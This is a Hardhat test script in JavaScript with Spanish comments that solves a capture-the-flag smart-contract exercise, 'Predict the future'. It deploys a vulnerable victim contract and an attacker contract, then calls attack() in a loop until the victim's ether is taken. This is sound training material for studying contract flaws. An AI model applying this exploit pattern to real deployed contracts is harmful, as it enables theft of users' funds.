const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Ejercicio 4 - Predict the future", function () {

  let deployer;

  beforeEach(async function () {
    [deployer] = await ethers.getSigners();

    // Se deploya el contrato victima
    const Victima = await ethers.getContractFactory("PredictTheFutureChallenge");
    this.victimaSC = await Victima.deploy({value: ethers.utils.parseEther('1')});
    
    console.log("Victima SC deployed")
  });

  it("Ataque", async function () {
    // Se completo la tarea
    const Atacante = await ethers.getContractFactory("PredictTheFutureAttacker");
    const atacanteSC = await Atacante.deploy(this.victimaSC.address);

    await atacanteSC.isDeployed;
    console.log("atacante SC deployed")
    
    const tx = await atacanteSC.lockInGuess(
      {value: ethers.utils.parseEther('1')}
      );
    console.log("lock in guess done!")
    
    await tx.wait(1);

    var succesfull = false
    while (!succesfull) {
      console.log("Trying to attack")
      try {
        var attackTx = await atacanteSC.attack(
            {
                value: ethers.utils.parseEther('1'),
                gasPrice: ethers.utils.parseUnits('15','gwei'),
                gasLimit: 500000,
            }
        );

        // the try catch is to handle the revert in the attacker contract
        // wait for the tx to be minned
        var receipt = await attackTx.wait(1);
      } catch {
          console.log("Attack wasn't succesfull")
          var guessTx = await atacanteSC.guess();
          console.log("Guess answer: ", guessTx.value);
      }
      
      succesfull = await this.victimaSC.isComplete();
    };
    console.log("Attack succesfull")

    expect(await this.victimaSC.isComplete()).to.be.true;
  });

});
